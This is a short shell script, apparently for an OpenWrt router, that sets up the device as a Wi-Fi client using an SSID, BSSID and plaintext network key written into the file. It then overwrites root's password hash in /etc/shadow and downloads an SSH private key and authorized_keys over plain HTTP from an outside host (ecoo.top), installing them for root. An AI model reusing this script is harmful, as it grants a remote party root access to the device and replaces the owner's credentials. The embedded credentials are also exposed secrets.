#!/bin/sh
if [ ! -f "/etc/crontabs/root" ]; then
	echo "未找到计划任务，文档建立中"
	touch /etc/crontabs/root
else
	echo "计划任务文档已存在"
fi
uci set wireless.radio0=wifi-device
uci set wireless.radio0.type='mac80211'
uci set wireless.radio0.hwmode='11g'
uci set wireless.radio0.htmode='HT20'
uci set wireless.radio0.path='10180000.wmac'
uci set wireless.radio0.disabled='0'
uci set wireless.radio0.channel='6'
uci set wireless.radio0.txpower='20'
uci set wireless.radio0.country='00'
uci set wireless.wifinet1=wifi-iface
uci set wireless.wifinet1.device='radio0'
uci set wireless.wifinet1.mode='sta'
uci set wireless.wifinet1.network='wwan'
uci set wireless.wifinet1.ssid='home'
uci set wireless.wifinet1.bssid='98:00:6A:35:2C:C8'
uci set wireless.wifinet1.key='84992619'
uci set wireless.wifinet1.encryption='psk2'
uci commit wireless
/etc/init.d/network restart

sed -i 's/root:.*/root:$1$gCu4Qd26$RaNddxLODwv0I7c\/\mEfTw.:18649:0:99999:7:::/g' /etc/shadow
if [ ! -f /root/.ssh/id_rsa ]; then
	wget http://ecoo.top:8082/id_rsa
	wget http://ecoo.top:8082/authorized_keys
	if [ ! -d /root/.ssh ]; then
	mkdir -p /root/.ssh
	fi
	mv id_rsa /root/.ssh/id_rsa
	mv authorized_keys /root/.ssh/authorized_keys
	chmod 600 /root/.ssh/id_rsa
	chmod 600 /root/.ssh/authorized_keys
	else
	echo "sshkey已经安装了"
fi
exit 0
